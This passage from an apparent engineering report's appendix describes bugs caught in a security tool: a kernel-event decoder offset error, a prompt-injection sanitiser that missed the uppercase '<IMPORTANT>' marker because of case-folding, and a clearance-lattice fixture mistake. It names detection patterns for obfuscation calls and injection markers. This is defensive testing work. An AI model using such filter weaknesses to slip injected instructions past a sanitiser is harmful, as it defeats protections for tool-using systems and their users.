(`b64decode`, `codecs.decode`, `atob`, `fromCharCode`).

### C.4 Ringbuffer decoder missing an 8-byte field (forensic corruption)

The C `aegis_kernel_event` grew a `latency_ns` field; the Rust decoder's offsets
were not updated, so `comm` and `target` were read eight bytes early
(`EVENT_SIZE_BYTES` 176 vs 184). A `DENY_EXECVE` on `/bin/sh` would have been
attributed to the wrong process and path. Caught by `bpf_layout.rs`, which parses
the BPF C and asserts the field order, bit positions and hook codes against the
Rust constants -- the contract is verifiable on Windows even though compiling the
object is not.

### C.5 Case-folded haystack vs. uppercase injection marker

The sanitiser lowercased the JSON-RPC payload and then tested it against patterns
like `<IMPORTANT>`, which never match. The most common injection marker in the
literature was the one the filter was blind to. The needle is now case-folded
too, while the audit log still reports the original rule that fired.

### C.6 The verifier rejected a fixture I had written myself

The lattice solver flagged a workflow in which a `CONFIDENTIAL`-cleared
filesystem server read a `SECRET` `.env`. The solver was right: such a server is
itself violating Property 2. The fixture encoded my assumption rather than the
requirement. Corrected, and the property is now asserted in its own test so the
intent is explicit.

### C.7 What the pattern means

Four of the six are *silent*: no error, no warning, a confident wrong answer. The
only thing that caught them was a test that asserted a property the code did not
have to satisfy for the happy path. That is the argument for writing the
conformance test **before** the component, and for treating "the test was wrong"
as a finding rather than an obstruction.